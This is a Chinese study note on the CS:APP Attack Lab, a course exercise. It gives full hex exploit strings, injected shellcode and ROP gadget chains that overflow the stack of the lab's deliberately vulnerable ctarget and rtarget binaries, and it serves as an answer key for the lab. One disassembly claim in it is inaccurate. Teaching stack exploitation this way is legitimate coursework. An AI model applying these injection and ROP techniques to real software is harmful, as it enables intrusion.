# Attack Lab 笔记

这个 lab 的文件包含：

> README.txt: A file describing the contents of the directory.    
ctarget: An executable program vulnerable to code-injection attacks.   
rtarget: An executable program vulnerable to return-oriented-programming attacks.   
cookie.txt: An 8-digit hex code that you will use as a unique identifier in your attacks.     
farm.c: The source code of your target’s “gadget farm,” which you will use in generating return-oriented programming attacks.       
hex2raw: A utility to generate attack strings.

实验解答保存在 [resultn.txt](../labs/attack/) 中；这里运行 `./ctarget -q` 要用 `-q` ，毕竟不是 CMU 的学生，`-q` 的作用: `Don’t send results to the grading server` 。  
这次的 lab 要仔细看官方的文档，里面是题目的要求，也包含解题指导。  
这次 lab 就是输入攻击字符串，实现调用函数等目的，包含了对栈破坏，注入代码，ROP 攻击等方法，说明了栈溢出的危害。这里要使用 `unix> ./hex2raw < result.txt | ./ctarget` 来查看解答是否正确，解答保存在 `result.txt` 中，这里命令中的 `|`表示管道，就是把前面的输出作为后面的输入，`./hex2raw` 根据输入的 16 进制字符串生成攻击字符串；       
参考资料：    
[CMU 的官方文档](http://csapp.cs.cmu.edu/3e/attacklab.pdf)          
[马天猫的CS学习之旅](https://zhuanlan.zhihu.com/p/28476993)   
[CSAPP 3e Attack lab](https://web.archive.org/web/20200301000000*/http://www.voidcn.com/article/p-dqoqchyx-tr.html)    

在解题之前，和 bomb lab 一样， 首先反汇编可执行程序，生成汇编代码。  
 `objdump -d ctarget > ctarget.d`   
 利用汇编代码来分析程序。

## Part 1

这一部分都是利用栈溢出和注入代码的攻击，题目较简单。

## 第一题

题目要求输入字符串，攻击 `getbuf` ，在 `test` 函数中调用 `touch1` 函数；       
第一题 `getbuf` 中 ：

```
4017a8:       48 83 ec 28          sub    $0x28,%rsp
```

 栈有 `0x28` 即 40 个字节，注意 x86-64 在函数调用时会自动将返回地址压入栈，因此调用函数时栈顶就是返回地址，只要修改它就能调用其他的函数了，输入 40 个字节后，使栈溢出，再输入个地址就能破坏 `getbuf` 返回地址，返回时就会调用修改了的地址对应的函数，这里的是个八字节的 64 位地址，按题目要求就是 `touch1` 函数的地址， `00000000004017c0 <touch1>:` ，注意这里机器要用小端法存入地址写成： `c0 17 40 00 00 00 00 00` ，因此第一题答案就是任意 40 个字节加上该地址。   
答案可以是：

```
51 51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
c0 17 40 00 00 00 00 00
```

## 第二题

要求跳转到 `touch2` 函数，在第一题基础上加入了传值的要求；
方法就是注入代码，将返回地址改为注入代码的首地址，然后给参数的寄存器`%rdi`赋值，接着再次调用 `touch2` 时就有参数值了；    
注入的代码：

```
movq $0x59b997fa,%rdi
pushq $0x004017ec
retq
```

第一行传值，传的值 `cookie` 为 `0x59b997fa` ，第二行将调用 `touch2` 的地址压入栈，这样第三行返回时，就可以调用 `touch2` 了，注意题目规定不能用 `jmp` 的；   
将注入代码保存为 `code.s` 文件，参考文档，使用 `gcc -c code.s` 编译，再用 `objdump -d code.o > code.d` 反汇编就能得到十六进制表示的机器代码了，将这段代码通过 `getbuf` 放入栈中（首地址在栈顶，可以通过 `gdb` 打个断点，打印 `%rsp` 的值就是栈顶了），再和第一题一样填充到40字节，结尾加上注入代码的地址就是答案了：

```
48 c7 c7 fa 97 b9 59
68 ec 17 40 00
c3
51 51 51
51 51 51 51 51
51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
78 dc 61 55 00 00 00 00
```

## 第三题

第三题也是注入代码，将 `cookie` 的字符串的地址传入函数，注入代码和第二题类似，但是注意因为第三题中，后续操作会将 buf 栈中的 40 个字节覆盖了，所以不能将字符串存储中这里，改为存储在调用函数前的栈中，通过打断点得到其栈顶地址是 `0x5561dca0` 。所以应该把字符串存入的地址设为 `0x5561dca8` ，这个地址在输入的 16 进制中就紧跟着跳转的地址。   
注入的代码（已经反编译了）：

```
   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   7:	68 fa 18 40 00       	pushq  $0x4018fa
   c:	c3                   	retq   
```

再和上题类似填充至 40 字节，附上跳转地址。再将 `cookie` 转化为 16 进制的字符串附到跳转地址后面，根据 `ASCII` 码，这里的 `cookie` 值 `0x59b997fa` 就是 `35 39 62 39 39 37 66 61 00` 这里末尾加 `00` ，我不知道是什么意思，不过看很多人都加了，我也跟风。。经验证，加不加对结果无影响。因而最终答案是：

```
48 c7 c7 a8 dc 61 55 
68 fa 18 40 00 
c3 
30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61 00
```

## Part2

四、五题是 Return-Oriented Programming ，这两题更难，因为引入了栈随机化和限制了可执行代码区域：

> - It uses randomization so that the stack positions differ from one run to another. This makes it impos-
sible to determine where your injected code will be located.
> - It  marks  the  section  of  memory  holding  the  stack  as  nonexecutable,  so  even  if  you  could  set  the program counter to the start of your injected code, the program would fail with a segmentation fault.     

栈随机化使得栈上的地址不确定，无法直接跳转到栈上的指定地址；可执行代码区域是限制的，使得注入栈上的代码无法执行。    
所以这里要引入新的攻击方式，就是 ROP 攻击，ROP 的具体讲解可以参考指导文档，ROP 的攻击思路就是，寻找、利用函数自带的一些 gadgets ，使之构成一个攻击链，这样利用程序自身的函数片段，就能绕过新的安全限制。 

## 第四题

这题要求在新的保护下重复第二题的结果，将 `cookie` 值传入 `%rdi` ，这里和第二题一样使得栈溢出，然后将返回地址设为 `gadgets` 攻击链的起始地址。攻击链可以这样构造，观察代码发现：

```
00000000004019a7 <addval_219>:
  4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
  4019ad:       c3                      retq
```

查阅文档， `58 90` 即是 `popq %rax` ，`90` 是 `nop` ，可以直接忽视，这段代码地址是 `0x4019ab` ，它将栈上的值存入了寄存器，接着发现：

```
00000000004019a0 <addval_273>:
  4019a0:       8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:       c3
```

查阅文档， `48 89 c7` 就是 `movq %rax,%rdi` ，就将栈上的值存入了 `%rdi` ，因此将 `cookie` 值存入栈中，就可以传值，这段代码地址是 `0x4019a2` 。    
因此输入字符串先是一段填充的 40 字节，然后是跳转地址，设为 pop 的地址 `0x4019ab` ，接着存入 `cookie` 值（就是将要 pop 的那个值，注意应存入 64 位值），然后是 mov 的地址 `0x4019a2` ，最后跳转到 `touch2` ，这样一个完整的 ROP 攻击链就形成了，一个可行的答案就是：

```
51 51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

## 第五题

与上题类似，要求重复第三题的结果，要求将 `cookie` 字符串的地址存入 `%rdx` ，考虑到栈随机化，无法直接得到地址。注意到这里 `48 89 e0 90` 是 `movq %rsp,%rax` ，将栈顶的地址存在了 `%rax` ，可以利用这一点来传地址。

```
0000000000401aab <setval_350>:
  401aab:       c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)
  401ab1:       c3                      retq
```

由上题我们可以实现 `movq %rax,%rdi` ，是不是直接将传入的字符串存到栈顶，再将栈顶地址存入 `%rdi` 就做完了？这里要注意，如果直接将字符串存到栈顶， `48 89 e0 90 c3` 在返回时会跳转到栈顶，字符串就成要运行的指令了，就会发生错误。       
这里考虑将栈顶地址加值传入，使得要传入的字符串与栈顶拉开距离，不被执行。（我开始试图用官方文档给的参考指令给 `%eax` 做加法，但很复杂还不一定能成，我把它附在了最后面[1]，有闲情再看吧T_T）这里的加法用到了一个文档里没有的指令：

```
00000000004019d6 <add_xy>:
  4019d6:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax
  4019da:       c3                      retq
```

`04 37` 是 `add $0x37,%al` ，可以表示将传入的字符串存在距离栈顶 `0x37` （55）字节处。  
由上，可以构造这样一个攻击链：   
先填充 40 字节破坏栈，紧接着是  `movq %rsp,%rax`，将下一个栈顶位置存入 `%rax` ，代码位置是 `0x401aad`；接着 `add $0x37,%al` ，给 `%rax` 加值 `0x37` ，这段代码位置是 `0x4019d8` ；然后将 `%rax` 值传入函数的参数 `%rdi` ，代码位置由上题是 `0x4019a2` ，然后跳转到 `touch3` 函数，地址是 `0x4018fa` ；最后存入字符串，并在其前面填充字节使其地址与保存的栈顶地址相差 55 个字节，共要填充 `(55-3×8)=31` 个字节，所以答案可以是：

```
51 51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
ad 1a 40 00 00 00 00 00
d8 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
31 31 31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31 31 31
31 31 31 31 31 31 31 31 31 31
31
35 39 62 39 39 37 66 61 00
```

## 小结

这次 lab 较简单，涉及了栈随机化，ROP 攻击等内容，通过这个 lab ，我对汇编、栈都有了更深的了解，这篇文章给了所有题目的解答，但是，这里有一个问题：使用这些解答存在出现 `Type string:Ouch!: You caused a segmentation fault!` 的可能，原因未知，此篇解答与参考资料里的解答也能对应上，所以我想出现这个问题可能是机器的原因吧？

### [1]附：一种复杂可能错误的加法

加法可以用以下方法得到：

```
00000000004019d6 <add_xy>:
  4019d6:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax
  4019da:       c3                      retq
```

给 `%rdi` 赋值可以从 `%eax` 传入，`%rsi` 赋值可以按以下方法：

```
  00000000004019db <getval_481>:
  4019db:       b8 5c 89 c2 90          mov    $0x90c2895c,%eax
  4019e0:       c3                      retq
```

将 `%eax` 值传给了 `%edx`

```
0000000000401a33 <getval_159>:
  401a33:       b8 89 d1 38 c9          mov    $0xc938d189,%eax
  401a38:       c3                      retq
```

将 `%edx` 值传给了 `%ecx` ，这里 `38 c9` 是 `cmpb %cl,%cl` 不影响值。

```
0000000000401a11 <addval_436>:
  401a11:       8d 87 89 ce 90 90       lea    -0x6f6f3177(%rdi),%eax
  401a17:       c3 
```

再将 `%ecx` 传给 `%esi` ，以上步骤就完成了从 `%eax` 传值到 `%esi` 。

```
00000000004019d0 <mid_farm>:
  4019d0:       b8 01 00 00 00          mov    $0x1,%eax
  4019d5:       c3                      retq
```

由上可以将 `0x1` 赋值给 `%eax` ，再赋值给 `%edx`，将栈顶传给 `%eax` ，再赋值给 `%esi` ，这里有个问题就是以上都是对三十二位操作。。
